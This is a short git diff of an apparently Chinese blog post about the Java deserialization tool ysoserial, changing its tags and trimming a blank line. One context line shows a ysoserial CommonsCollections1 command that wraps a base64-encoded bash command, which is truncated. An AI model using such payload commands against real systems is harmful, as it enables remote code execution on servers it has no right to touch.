@@ -7,7 +7,7 @@ lastmod: "2024-08-19T21:06:28"
 image: ""
 license: ""
 categories: ["talk"]
-tags: ["工具", "Java"]
+tags: ["Java反序列化", "工具"]
 ---
 # 安装
 
@@ -189,4 +189,3 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "bash -c {echo,Ym
 ```
 
 但是发现编码会多空格符号，去掉即可，但是这个问题确实是不知道怎么触发的
-
